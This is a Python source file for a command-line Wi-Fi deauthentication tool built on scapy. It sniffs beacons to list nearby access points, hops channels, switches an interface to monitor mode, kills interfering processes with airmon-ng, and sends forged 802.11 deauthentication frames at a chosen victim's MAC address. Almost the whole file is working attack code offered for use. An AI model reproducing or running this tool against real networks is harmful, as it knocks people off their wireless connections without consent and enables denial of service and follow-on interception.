#!/usr/bin/env python3

from scapy.all import Dot11, Dot11Beacon, Dot11Elt, sniff, RadioTap, Dot11, Dot11Deauth, sendp 
from threading import Thread
import time
import os
import sys
import argparse
import logging 
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import pandas

if os.geteuid() != 0 :
    print("As we are going to use raw sockets in this tool, you can only run this tool as a superuser. Try using sudo.")
    sys.exit(0)


##dataframe to store sniffed networks(Aps)
accesspoints = pandas.DataFrame(columns=["BSSID","SSID","dBm_Signal","Channel","Crypto"])
accesspoints.set_index("BSSID", inplace=True)

##beacons sniffing for APs
def beacon_sniff(packet):
    if packet.haslayer(Dot11Beacon):
        #extract the mac of AP
        bssid = packet[Dot11].addr2
        #get the service set identifier of the AP
        ssid = packet[Dot11Elt].info.decode()
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        #extract network status
        stats = packet[Dot11Beacon].network_stats()
        #get the channel of AP
        channel = stats.get("channel")
        #get the crypto
        crypto = stats.get("crypto")
        accesspoints.loc[bssid] = (ssid , dbm_signal, channel, crypto)
        

def changing_channel():
    while True:
        for i in range(1,14):
            os.system(f"iwconfig {args.interface} channel {i}")
            time.sleep(0.5)

def printing():
    while True:
        os.system("clear")
        print(accesspoints)
        time.sleep(0.5)
        
def threads():
    printer = Thread(target=printing,daemon=True)
    printer.start()

    channel_change = Thread(target=changing_channel,daemon=True)
    channel_change.start()

##deauth 
def deauth(iface,count,bssid,target_mac):
    frame = RadioTap()/Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)/Dot11Deauth()
    sendp(frame, iface=iface, count=count, inter=0.100)


def banner():
    print("""
                                                                 
       ,,                                          ,,        
     `7MM                                  mm    `7MM        
       MM                                  MM      MM        
  ,M""bMM   .gP"Ya   ,6"Yb.  `7MM  `7MM  mmMMmm    MMpMMMb.  
,AP    MM  ,M'   Yb 8)   MM    MM    MM    MM      MM    MM  
8MI    MM  8M""""""  ,pm9MM    MM    MM    MM      MM    MM  
`Mb    MM  YM.    , 8M   MM    MM    MM    MM      MM    MM  
 `Wbmd"MML. `Mbmmd' `Moo9^Yo.  `Mbod"YML.  `Mbmo .JMML  JMML.

    Check-kill>>>sudo ./deauth.py -k [interface]                                              
    Monitor mode>>>sudo ./deauth.py -m [interface]
    Scan for APs>>>sudo ./deauth.py [interface]
    Deauth attack>>>sudo ./deauth.py -c {1000} -a {xx:xx:xx:xx:xx:xx} -t {xx:xx:xx:xx:xx:xx} [interface]
    
    """)


if __name__=="__main__":
    parser = argparse.ArgumentParser(description=banner())
    parser.add_argument("interface",help = "interface to sniff for Aps and to do deauthentication attack")
    parser.add_argument("-c", "--count",metavar="",help="The number of deauthentication packets to send to the target station (or) victim computer",type=int,dest="count")
    parser.add_argument("-a", "--bssid",metavar="",help="Basic Service Set Identifier(BSSID) of the  wireless access point(WAP)",dest="bssid")
    parser.add_argument("-t", "--target-mac",metavar="",help="MAC address of the target station(victim's computer)",dest="target_mac")
    parser.add_argument("-m", "--monitor-mode",action="store_true",help="You can use this to enable monitor mode on the specified interface,to use this option make sure ifconfig and iwconfig tools are installed on your system. Mostly they come by defualt on all major distributions.",dest="monitor_mode")
    parser.add_argument("-k", "--check-kill",help="You can use this option to kill the network manager and other network process on your system that may interrupt our work on being in Monitor mode. Doing this is not mandatory but its always recommended for better results, to use this make sure airmon-ng(of aircrack-ng) is installed on our system, it comes by default with all major pentration testing distributions.",action="store_true",dest="check_kill")
    


    args = parser.parse_args()

    if args.interface and not args.count and not args.bssid and not args.target_mac and not args.check_kill and not args.monitor_mode :
        threads()
        sniff(prn=beacon_sniff,iface = args.interface)
    if args.interface and args.count and args.bssid and args.target_mac :
        deauth(args.interface, int(args.count), args.bssid, args.target_mac)
    if args.monitor_mode:
        if args.count or args.bssid or args.target_mac or args.check_kill:
            print("monitor mode option should be used alone. You cannot specify other optional arguments while enabling monitor mode.")
        else:
            os.system(f"ifconfig {args.interface} down")
            time.sleep(1)
            os.system(f"iwconfig {args.interface} mode Monitor")
            os.system(f"ifconfig {args.interface} down")
            time.sleep(4)
            print(f"Successfully enabled Monitor mode on interface:{args.interface}")
            sys.exit(0)
    if args.check_kill:
        if args.count or args.bssid or args.target_mac or args.monitor_mode :
            print("check kill option should be used alone. You cannot specify other optional arguments while using this option.")
        else:
            print(os.system("airmon-ng check"))
            os.system("airmon-ng check kill")
            print("Successfully killed the above processes,now u can enable Monitor mode.")
            sys.exit(0)



